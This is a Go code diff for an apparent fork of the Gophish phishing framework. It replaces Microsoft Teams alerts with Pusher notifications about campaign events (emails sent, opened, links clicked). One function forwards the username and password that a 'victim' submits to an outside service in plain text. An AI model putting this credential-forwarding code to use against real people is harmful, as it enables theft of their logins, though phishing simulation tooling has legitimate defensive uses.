@@ -15,8 +15,7 @@ import (
     "github.com/jinzhu/gorm"
     "github.com/oschwald/maxminddb-golang"
     "github.com/gophish/gophish/config"
-    goteamsnotify "github.com/atc0005/go-teams-notify/v2"
-    "github.com/atc0005/go-teams-notify/v2/messagecard"
+    pusher "github.com/pusher/pusher-http-go/v5"
     "github.com/twilio/twilio-go"
     openapi "github.com/twilio/twilio-go/rest/api/v2010"
 )
@@ -63,66 +62,81 @@ type Submitted struct {
     Details      EventDetails
 }
 
-func (r *Result) TeamsNotifyEmailSent(webhook_url string) {
-    mstClient := goteamsnotify.NewTeamsClient()
-    msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Email Sent"
-    msgCard.Text = "Email has been sent to victim: **" + r.Email + "**"
-    msgCard.ThemeColor = "#00FF00"
-
-    if err := mstClient.Send(webhook_url, msgCard); err != nil {
-        log.Error("failed to send teams message: %v", err)
-    }
+func (r *Result) PusherNotifyEmailSent(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
+	pusherClient := pusher.Client{
+		AppID: app_id,
+		Key: app_key,
+		Secret: secret,
+		Cluster: cluster,
+		EncryptionMasterKeyBase64: encrypt_key,
+	}
+	data := map[string]string{"event": "Email Sent", "time": r.ModifiedDate.String(), "message": "Email has been sent to victim: <strong>" + r.Email + "</strong>"}
+	err := pusherClient.Trigger(channel_name, "event", data)
+	if err != nil {
+		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+	}
 }
 
-func (r *Result) TeamsNotifySMSSent(webhook_url string) {
-    mstClient := goteamsnotify.NewTeamsClient()
-    msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "SMS Sent"
-    msgCard.Text = "SMS has been sent to victim: **" + r.Email + "**"
-    msgCard.ThemeColor = "#00FF00"
-
-    if err := mstClient.Send(webhook_url, msgCard); err != nil {
-        log.Error("failed to send teams message: %v", err)
-    }
+func (r *Result) PusherNotifySMSSent(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
+	pusherClient := pusher.Client{
+		AppID: app_id,
+		Key: app_key,
+		Secret: secret,
+		Cluster: cluster,
+		EncryptionMasterKeyBase64: encrypt_key,
+	}
+	data := map[string]string{"event": "SMS Sent", "time": r.ModifiedDate.String(), "message": "SMS has been sent to victim: <strong>" + r.Email + "</strong>"}
+	err := pusherClient.Trigger(channel_name, "event", data)
+	if err != nil {
+		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+	}
 }
 
-func (r *Result) TeamsNotifyEmailOpened(webhook_url string) {
-    mstClient := goteamsnotify.NewTeamsClient()
-    msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Email Opened"
-    msgCard.Text = "Email has been opened by victim: **" + r.Email + "**"
-    msgCard.ThemeColor = "#FFFF00"
-
-    if err := mstClient.Send(webhook_url, msgCard); err != nil {
-        log.Error("failed to send teams message: %v", err)
-    }
+func (r *Result) PusherNotifyEmailOpened(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
+	pusherClient := pusher.Client{
+		AppID: app_id,
+		Key: app_key,
+		Secret: secret,
+		Cluster: cluster,
+		EncryptionMasterKeyBase64: encrypt_key,
+	}
+	data := map[string]string{"event": "Email Opened", "time": r.ModifiedDate.String(), "message": "Email has been opened by victim: <strong>" + r.Email + "</strong>"}
+	err := pusherClient.Trigger(channel_name, "event", data)
+	if err != nil {
+		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+	}
 }
 
-func (r *Result) TeamsNotifyClickedLink(webhook_url string) {
-    mstClient := goteamsnotify.NewTeamsClient()
-    msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Clicked Link"
-    msgCard.Text = "Link has been clicked by victim: **" + r.Email + "**"
-    msgCard.ThemeColor = "#FF9900"
-
-    if err := mstClient.Send(webhook_url, msgCard); err != nil {
-        log.Error("failed to send teams message: %v", err)
-    }
+func (r *Result) PusherNotifyClickedLink(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
+	pusherClient := pusher.Client{
+		AppID: app_id,
+		Key: app_key,
+		Secret: secret,
+		Cluster: cluster,
+		EncryptionMasterKeyBase64: encrypt_key,
+	}
+	data := map[string]string{"event": "Clicked Link", "time": r.ModifiedDate.String(), "message": "Link has been clicked by victim: <strong>" + r.Email + "</strong>"}
+	err := pusherClient.Trigger(channel_name, "event", data)
+	if err != nil {
+		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+	}
 }
 
-func (r *Result) TeamsNotifySubmittedData(webhook_url string, details EventDetails) {
-    mstClient := goteamsnotify.NewTeamsClient()
-    msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Submitted Data"
-    username := details.Payload.Get("Username")
-    password := details.Payload.Get("Password")
-    msgCard.Text = "Victim **" + r.BaseRecipient.Email + "** has submitted data! Details:<br>**Username**: " + username + "<br>**Password**: " + password
-    msgCard.ThemeColor = "#FF0000"
-
-    if err := mstClient.Send(webhook_url, msgCard); err != nil {
-        log.Error("failed to send teams message: %v", err)
-    }
+func (r *Result) PusherNotifySubmittedData(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string, details EventDetails) {
+	pusherClient := pusher.Client{
+		AppID: app_id,
+		Key: app_key,
+		Secret: secret,
+		Cluster: cluster,
+		EncryptionMasterKeyBase64: encrypt_key,
+	}
+	username := details.Payload.Get("Username")
+	password := details.Payload.Get("Password")
+	data := map[string]string{"event": "Submitted Data", "time": r.ModifiedDate.String(), "message": "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password}
+	err := pusherClient.Trigger(channel_name, "event", data)
+	if err != nil {
+		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+	}
 }
 
 func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
@@ -182,10 +196,17 @@ func (r *Result) HandleSMSSent(twilio_account_sid string, twilio_auth_token stri
         r.SendDate = event.Time
         r.Status = EventSent
         r.ModifiedDate = event.Time
-        teams_webhook := conf.TeamsWebhookURL
-        if len(teams_webhook) != 0 {
-            r.TeamsNotifySMSSent(teams_webhook)
-        }
+        
+		if conf.EnablePusher {
+			pusher_app_id := conf.PusherAppId
+			pusher_app_key := conf.PusherAppKey
+			pusher_app_secret := conf.PusherAppSecret
+			pusher_app_cluster := conf.PusherAppCluster
+			pusher_encrypt_key := conf.PusherEncryptKey
+			pusher_channel_name := conf.PusherChannelName
+			r.PusherNotifySMSSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
+		}
+
         sent := MyResult{}
         sent.Email = target
         sent.Id = r.Id
@@ -248,10 +269,15 @@ func (r *Result) HandleEmailSent() error {
         fmt.Printf("[-] Failed to load config.json from default path!")
     }
 
-    teams_webhook := conf.TeamsWebhookURL
-    if len(teams_webhook) != 0 {
-        r.TeamsNotifyEmailSent(teams_webhook)
-    }
+    if conf.EnablePusher {
+		pusher_app_id := conf.PusherAppId
+		pusher_app_key := conf.PusherAppKey
+		pusher_app_secret := conf.PusherAppSecret
+		pusher_app_cluster := conf.PusherAppCluster
+		pusher_encrypt_key := conf.PusherEncryptKey
+		pusher_channel_name := conf.PusherChannelName
+		r.PusherNotifyEmailSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
+	}
 
     return db.Save(r).Error
 }
@@ -301,10 +327,15 @@ func (r *Result) HandleEmailOpened(details EventDetails) error {
         fmt.Printf("[-] Failed to load config.json from default path!")
     }
 
-    teams_webhook := conf.TeamsWebhookURL
-    if len(teams_webhook) != 0 {
-        r.TeamsNotifyEmailOpened(teams_webhook)
-    }
+    if conf.EnablePusher {
+		pusher_app_id := conf.PusherAppId
+		pusher_app_key := conf.PusherAppKey
+		pusher_app_secret := conf.PusherAppSecret
+		pusher_app_cluster := conf.PusherAppCluster
+		pusher_encrypt_key := conf.PusherEncryptKey
+		pusher_channel_name := conf.PusherChannelName
+		r.PusherNotifyEmailOpened(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
+	}
 
     return db.Save(r).Error
 }
@@ -351,10 +382,15 @@ func (r *Result) HandleClickedLink(details EventDetails) error {
         fmt.Printf("[-] Failed to load config.json from default path!")
     }
 
-    teams_webhook := conf.TeamsWebhookURL
-    if len(teams_webhook) != 0 {
-        r.TeamsNotifyClickedLink(teams_webhook)
-    }
+    if conf.EnablePusher {
+		pusher_app_id := conf.PusherAppId
+		pusher_app_key := conf.PusherAppKey
+		pusher_app_secret := conf.PusherAppSecret
+		pusher_app_cluster := conf.PusherAppCluster
+		pusher_encrypt_key := conf.PusherEncryptKey
+		pusher_channel_name := conf.PusherChannelName
+		r.PusherNotifyClickedLink(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
+	}
 
     return db.Save(r).Error
 }
@@ -397,10 +433,15 @@ func (r *Result) HandleFormSubmit(details EventDetails) error {
         fmt.Printf("[-] Failed to load config.json from default path!")
     }
 
-    teams_webhook := conf.TeamsWebhookURL
-    if len(teams_webhook) != 0 {
-        r.TeamsNotifySubmittedData(teams_webhook, details)
-    }
+	if conf.EnablePusher {
+		pusher_app_id := conf.PusherAppId
+		pusher_app_key := conf.PusherAppKey
+		pusher_app_secret := conf.PusherAppSecret
+		pusher_app_cluster := conf.PusherAppCluster
+		pusher_encrypt_key := conf.PusherEncryptKey
+		pusher_channel_name := conf.PusherChannelName
+		r.PusherNotifySubmittedData(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name, details)
+	}
 
     return db.Save(r).Error
 }
